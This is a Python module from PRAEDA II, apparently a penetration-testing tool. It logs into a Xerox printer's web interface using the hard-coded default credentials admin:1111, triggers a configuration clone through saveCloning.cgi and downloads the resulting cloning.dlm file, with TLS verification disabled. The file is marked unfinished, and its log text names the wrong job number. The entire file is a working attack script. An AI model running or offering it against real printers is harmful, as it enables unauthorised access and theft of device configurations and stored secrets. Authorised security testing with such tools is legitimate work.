######################################################
#                 PRAEDA II Module #MP0007           #
#                  Copyright (C) 2024                #
######################################################
#          Xerox clone recovery                      #
#         In Progress  not completed                 #
######################################################
import requests

def MP0007(target, ports, web, output, logfile, data1):
    auth = "YWRtaW46MTExMQ=="  # Base64 for "admin:1111"
    headers = {"Authorization": f"Basic {auth}"}
    post_url = f"http{web}://{target}:{ports}/properties/GeneralSetup/Clone/saveCloning.cgi"
    clone_url = f"http{web}://{target}:{ports}/cloning.dlm"
    post_data = {
        "CLONE_FEATURES": "1%2C6%2C8%2C4%2C5%2C9%2C16%2C7%2C12%2C14%2C17%2C",
        "NextPage": "/properties/cloning.dhtml",
        "feature1": "1",
        "feature2": "6",
        "feature3": "8",
        "feature4": "4",
        "feature5": "5",
        "feature6": "9",
        "feature7": "16",
        "feature8": "7",
        "feature9": "12",
        "feature10": "14",
        "feature11": "17"
    }

    try:
        with open(f'{output}/{logfile}.log', 'a') as log_file:
            log_message = f"\n**********Attempting Clone Download Xerox {target} : JOB MP0013**********"
            log(log_file, log_message)

            response = requests.post(post_url, headers=headers, data=post_data, timeout=120, verify=False)

            if "Cloning" in response.text:
                download_clone_file(target, ports, clone_url, output, log_file)
            else:
                log(log_file, "Cloning post failed")
    except Exception as e:
        print(f"Failed to open output file {output}\nError: {str(e)}")

def download_clone_file(target, ports, clone_url, output, log_file):
    try:
        response = requests.get(clone_url, timeout=120, verify=False)

        output_path = f"./{output}/{target}-{ports}-cloning.dlm"
        with open(output_path, "a") as clone_file:
            clone_file.write(response.text)

        log(log_file, f"********** Clone Download Xerox {target}-{ports}-cloning.dlm **********")
    except Exception as e:
        log(log_file, f"An error occurred while downloading: {str(e)}")

def log(log_file, message):
    print(message)
    log_file.write(message + "\n")


